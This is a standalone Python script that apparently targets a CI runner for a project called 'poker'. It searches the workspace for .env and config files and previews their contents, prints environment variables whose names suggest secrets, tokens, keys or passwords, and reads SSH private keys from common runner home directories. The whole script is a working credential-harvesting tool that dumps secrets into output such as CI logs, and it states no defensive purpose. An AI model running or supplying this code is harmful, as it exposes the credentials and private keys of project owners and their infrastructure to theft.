#!/usr/bin/env python3
import os

def find_sensitive_files():
    print("\n=== FILES IN WORKSPACE ===")
    files_to_check = [
        ".env", "config.ini", "config_default.ini", "requirements.txt",
        "poker/config.ini", "poker/config_default.ini",
        "poker/tools/.env", "poker/tools/config.ini"
    ]
    for file in files_to_check:
        if os.path.exists(file):
            print(f"[+] Found: {file}")
            try:
                with open(file, "r") as f:
                    content = f.read(300)
                    print(f"    Preview: {content[:150]}...")
            except Exception as e:
                print(f"    [!] Could not read {file}: {e}")

def find_env_vars():
    print("\n=== SENSITIVE ENVIRONMENT VARIABLES ===")
    for key, value in os.environ.items():
        if any(x in key.upper() for x in ["SECRET", "TOKEN", "KEY", "PASS", "PWD", "CRED"]):
            print(f"[+] {key} = {value[:40]}...")

def find_ssh_keys():
    print("\n=== SSH KEYS IN COMMON LOCATIONS ===")
    ssh_paths = [
        "/home/runner/.ssh/id_rsa", "/root/.ssh/id_rsa", "/home/runneradmin/.ssh/id_rsa",
        "C:\\Users\\runneradmin\\.ssh\\id_rsa"
    ]
    for path in ssh_paths:
        if os.path.exists(path):
            print(f"[+] Found SSH key: {path}")
            try:
                with open(path, "r") as f:
                    print(f"    Preview: {f.read(100)}...")
            except Exception as e:
                print(f"    [!] Could not read {path}: {e}")

if __name__ == "__main__":
    find_sensitive_files()
    find_env_vars()
    find_ssh_keys()
